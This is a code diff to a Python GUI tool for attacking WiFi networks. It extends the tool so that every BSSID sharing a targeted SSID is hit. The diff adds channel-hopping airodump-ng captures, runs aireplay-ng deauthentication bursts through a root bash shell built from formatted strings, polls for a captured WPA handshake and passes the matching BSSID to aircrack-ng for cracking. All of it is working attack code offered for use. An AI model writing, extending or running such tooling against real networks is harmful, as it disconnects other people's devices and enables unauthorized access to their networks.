@@ -120,7 +120,7 @@ echo "READY: $MON_IFACE $CAPTURE_DIR"
 
 # ==================== NEW MONITORING WINDOW ====================
 class MonitorWindow:
-    def __init__(self, parent, net):
+    def __init__(self, parent, net, targets=None):
         self.parent = parent
         self.net = net
         self.wifi_iface = WIFI_IFACE
@@ -134,6 +134,22 @@ class MonitorWindow:
         self.capture_dir = None
         self.launch_cwd = os.getcwd()
         self._restored = False
+        self.hs_bssid = ""
+
+        # A "merged"/band-steering SSID is broadcast by several radios, each a
+        # separate BSSID on its own channel/band. Attack all of them so we catch
+        # the client on whichever band it's on. targets is the list of scan rows
+        # sharing this SSID; fall back to just the selected network.
+        seen = set()
+        self.targets = []
+        for t in (targets or [net]):
+            b = t.get("bssid", "")
+            if b and b not in seen:
+                seen.add(b)
+                self.targets.append({"bssid": b, "channel": str(t.get("channel", "")).strip()})
+        if not self.targets:
+            self.targets = [{"bssid": net.get("bssid", ""),
+                             "channel": str(net.get("channel", "")).strip()}]
 
         self.window = tk.Toplevel(parent)
         self.window.title(f"Monitoring: {net['ssid']}")
@@ -303,19 +319,27 @@ class MonitorWindow:
             if not self.running:
                 return
 
-            # Phase 2: lock to the target channel so we don't miss the handshake
+            # Phase 2: capture. With one BSSID we lock its channel; with a merged
+            # SSID spread across bands we hop between just the target channels so
+            # a handshake on either band lands (one radio can't do both at once).
             cap_path = os.path.join(self.capture_dir, "capture")
-            bssid = self.net.get("bssid", "")
-            channel = self.net.get("channel", "")
-            self.append_output(f"\nStarting airodump-ng on {self.mon_iface}"
-                               f"{' ch' + channel if channel else ''}...\n")
+            channels = []
+            for t in self.targets:
+                ch = t.get("channel", "")
+                if ch and ch not in channels:
+                    channels.append(ch)
+            channel_arg = ",".join(channels) if channels else "1"
 
-            channel = channel or "1"
+            self.append_output(f"\nStarting airodump-ng on {self.mon_iface} "
+                               f"(ch {channel_arg}, {len(self.targets)} BSSID(s))...\n")
+
             cmd = ["sudo", "airodump-ng", "--ignore-negative-one",
                    "-w", cap_path, "--essid", self.essid,
-                   "-c", channel]
-            if bssid:
-                cmd += ["-b", bssid]
+                   "-c", channel_arg]
+            # Pin -b only for a single BSSID; with several, --essid lets airodump
+            # capture a handshake for any radio of this SSID.
+            if len(self.targets) == 1 and self.targets[0]["bssid"]:
+                cmd += ["-b", self.targets[0]["bssid"]]
             cmd.append(self.mon_iface)
 
             self.process = subprocess.Popen(
@@ -342,8 +366,8 @@ class MonitorWindow:
             messagebox.showwarning("Not running", "Monitoring is not active.")
             return
 
-        bssid = self.net.get("bssid", "")
-        if not bssid:
+        bssids = [t["bssid"] for t in self.targets if t.get("bssid")]
+        if not bssids:
             messagebox.showerror("Error", "BSSID not available for this network.")
             return
 
@@ -351,14 +375,19 @@ class MonitorWindow:
             if self.deauth_process and self.deauth_process.poll() is None:
                 self.deauth_process.terminate()
 
-            cmd = ["sudo", "aireplay-ng", "-0", "10", "-a", bssid, self.mon_iface]
+            # Deauth every BSSID of the SSID so both bands of a merged SSID are
+            # hit. One radio can only inject on the channel it's currently on, so
+            # over airodump's hopping these land as each band's channel comes up.
+            script = "; ".join(
+                f"aireplay-ng -0 10 -a {b} {self.mon_iface}" for b in bssids
+            )
             self.deauth_process = subprocess.Popen(
-                cmd,
+                ["sudo", "bash", "-c", script],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
 
-            self.append_output(f"\n>>> Sent deauth burst on {bssid}\n")
+            self.append_output(f"\n>>> Sent deauth burst on {len(bssids)} BSSID(s): {', '.join(bssids)}\n")
             self.append_output("Watching for reconnect / handshake...\n\n")
 
         except Exception as e:
@@ -370,7 +399,7 @@ class MonitorWindow:
         if self.capture_dir:
             cap_files = glob.glob(os.path.join(self.capture_dir, "*.cap"))
             if cap_files:
-                bssid = self.net.get("bssid", "").lower()
+                target_bssids = [t["bssid"].lower() for t in self.targets if t.get("bssid")]
                 # Run aircrack-ng WITHOUT -b: the "(N handshake)" marker only shows
                 # up in the target-selection table, and passing -b makes most
                 # versions skip that table and jump to "specify a dictionary",
@@ -385,8 +414,14 @@ class MonitorWindow:
                     result = None
                 if result is not None:
                     for line in result.stdout.splitlines():
-                        if re.search(r"\([1-9]\d*\s+handshake", line) and \
-                                (not bssid or bssid in line.lower()):
+                        if not re.search(r"\([1-9]\d*\s+handshake", line):
+                            continue
+                        low = line.lower()
+                        match = next((b for b in target_bssids if b in low), "")
+                        if match or not target_bssids:
+                            # Remember which BSSID actually captured, so the crack
+                            # targets it (a merged SSID may hand off between bands).
+                            self.hs_bssid = match
                             self.window.after(0, self._enable_crack_btn)
                             return
         self.window.after(5000, self._poll_for_handshake)
@@ -404,7 +439,9 @@ class MonitorWindow:
         if not self.capture_dir:
             self.append_output("\nCapture directory not known yet.\n")
             return
-        bssid = self.net.get("bssid", "")
+        # Crack the BSSID that actually captured the handshake (set during
+        # polling); fall back to the originally selected network's BSSID.
+        bssid = self.hs_bssid or self.net.get("bssid", "")
         cap_files = glob.glob(os.path.join(self.capture_dir, "*.cap"))
         if not cap_files:
             self.append_output("\nNo .cap files found in capture directory.\n")
@@ -692,7 +729,10 @@ class WifiUI:
     def on_network_selected(self, net):
         self.set_status(f"Starting monitor for {net['ssid']}...")
         try:
-            MonitorWindow(self.root, net)
+            # Pass every scanned BSSID sharing this SSID so a merged/band-steering
+            # network is attacked across all its radios/bands, not just one card.
+            siblings = [n for n in self.networks if n.get("ssid") == net.get("ssid")]
+            MonitorWindow(self.root, net, siblings)
         except Exception as e:
             messagebox.showerror("Error", str(e))
 
